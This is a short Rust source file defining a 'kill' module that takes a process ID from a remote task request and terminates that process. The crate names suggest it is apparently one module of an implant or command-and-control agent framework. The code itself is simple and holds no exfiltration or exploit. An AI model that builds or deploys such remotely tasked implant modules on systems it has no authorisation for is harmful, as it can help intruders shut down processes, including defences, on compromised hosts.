use crate::prelude::*;

pub struct Kill {}

#[async_trait]
#[module_impl("kill")]
impl Module for Kill {}

#[async_trait]
impl ModuleImpl for Kill {
    async fn run(&mut self, id: u32, receiver: &mut malefic_proto::module::Input, _sender: &mut malefic_proto::module::Output) -> ModuleResult {
        let request = check_request!(receiver, Body::Request)?;

        let pid = check_field!(request.input)?;

        malefic_helper::common::process::kill(pid.parse()?)?;

        Ok(TaskResult::new(id))
    }
}